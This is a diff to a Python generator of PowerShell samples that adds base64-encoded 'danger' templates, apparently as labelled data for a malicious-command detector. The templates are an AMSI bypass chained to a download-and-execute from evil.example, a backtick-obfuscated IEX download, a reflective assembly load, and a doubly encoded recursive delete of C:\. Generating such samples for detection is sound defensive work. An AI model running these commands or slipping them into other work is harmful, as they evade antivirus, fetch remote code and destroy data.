@@ -210,6 +210,26 @@ def t_shell_exec_proc(ext):
     return _d("U3RhcnQtUHJvY2VzcyAtV2luZG93U3R5bGUgSGlkZGVuIC1GaWxlUGF0aCBjbWQuZXhlIC1Bcmd1bWVudExpc3QgJy9jIGNhbGMuZXhlJw==")
 
 
+def t_amsi_bypass(ext):
+    return _d("W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUpOyBJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9ldmlsLmV4YW1wbGUvYS5wczEnKQ==")
+
+
+def t_dotnet_reflect(ext):
+    return _d("W1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkKFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnVFZxUUFBTUFBQUFFQUFBQS8vOEFBTGdBQUFBPT0nKSk=")
+
+
+def t_backtick_iex(ext):
+    return _d("SWBFYFggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9ldmlsLmV4YW1wbGUvYi5wczEnKQ==")
+
+
+def t_encoded_nested(ext):
+    inner = "Remove-Item -Recurse -Force C:\\"
+    l1 = base64.b64encode(inner.encode("utf-16-le")).decode()
+    outer = "powershell -enc " + l1
+    l2 = base64.b64encode(outer.encode("utf-16-le")).decode()
+    return "powershell -enc " + l2
+
+
 # 安全命令模板 (纯文本，保持可读)
 def b_get_childitem(ext):
     return "Get-ChildItem C:\\Users\\%s" % ("admin", "john", "dev")[ext % 3]
@@ -317,6 +337,10 @@ DANGER_TEMPLATES = [
     (t_stop_process, 30),
     (t_iex_download_exec, 60),
     (t_shell_exec_proc, 20),
+    (t_amsi_bypass, 30),
+    (t_dotnet_reflect, 20),
+    (t_backtick_iex, 30),
+    (t_encoded_nested, 20),
     (t_iwr_download, 150),
     (t_downloadstring, 60),
     (t_taskkill, 10),
